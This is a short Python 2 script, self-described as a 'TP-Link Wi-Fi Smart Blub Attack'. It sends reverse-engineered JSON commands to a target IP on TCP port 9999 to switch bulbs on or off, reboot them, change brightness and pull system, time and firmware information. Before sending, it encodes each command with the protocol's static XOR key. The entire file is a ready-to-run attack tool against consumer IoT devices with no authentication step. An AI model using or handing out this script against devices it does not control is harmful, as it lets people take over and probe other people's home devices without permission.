import socket
import argparse


# Predefined Smart Blug Commands RE'd from Network and App Analysis
commands = {'bulbon'   : '{"smartlife.iot.smartbulb.lightingservice":{"transition_light_state":{"on_off":1}}}',
			'bulbgettime'  : '{"smartlife.iot.common.timesetting":{"get_time":{}}}',
			'bulboff'      :  '{"smartlife.iot.smartbulb.lightingservice":{"transition_light_state":{"on_off":0}}}',
			'bulbreboot'   : '{"smartlife.iot.common.system":{"reboot":{"delay":1}}}',
			'bulbsysinfo'  : '{"system":{"get_sysinfo":{}}}',
			'bulbtz'       : '{"smartlife.iot.common.timesetting":{"get_timezone":{}}}',
			'bulbgetstate'  : '{"system":{"get_light_state":{}}}',
			'bulbbright'    : '{"smartlife.iot.smartbulb.lightingservice":{"transition_light_state":{"brightness":1}}}',
			'cldfm'			: '{"smartlife.iot.common.cloud":{"get_intl_fw_list":{}}}'
				
}
	
# Encryption of TP-Link Smart Home Protocol
def encrypt(string, length):
	#Static Key 0xab (171)
	key = 171	
	#Padding Bytes
	result = "\x00\x00\x00"
	result += chr(length)
	for i in string: 
		a = key ^ ord(i)
		key = a
		result += chr(a)
	return result

# Decrpytion of TP-Link Smart Home Protocol
def decrypt(string):
	key = 171 
	result = ""
	for i in string: 
		a = key ^ ord(i)
		key = ord(i) 
		result += chr(a)
	return result

# Main Function
def main():
	
	join_cmd = ", ".join(commands)
	
	# Command Line Arguments
	parser = argparse.ArgumentParser(description="TP-Link Wi-Fi Smart Blub Attack")
	parser.add_argument("-t", "--target", required=True, help="Target IP Address")
	parser.add_argument("-c", "--command", help="Preset command to send. Choices are: %s" % join_cmd, choices=commands) 
	args = parser.parse_args()
	
	# User input IP and Ccommand
	ip = args.target
	cmd = commands[args.command]

	# Static port set by TP-Link 
	port = 9999

	# Length of Commmand
	length = len(cmd)

	# Send Command to Light Bulb and Receive Reply 
	try:
		sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_tcp.connect((ip, port))
		sock_tcp.send(encrypt(cmd, length))
		data = sock_tcp.recv(2048)
		sock_tcp.close()
		print "Sent:     %s" % (cmd)
		print "Received: %s" % (decrypt(data[4:]))
	except socket.error:
		quit("Cound not connect to host %s:%s" % (ip, str(port)))
		
if __name__ == '__main__':
    main()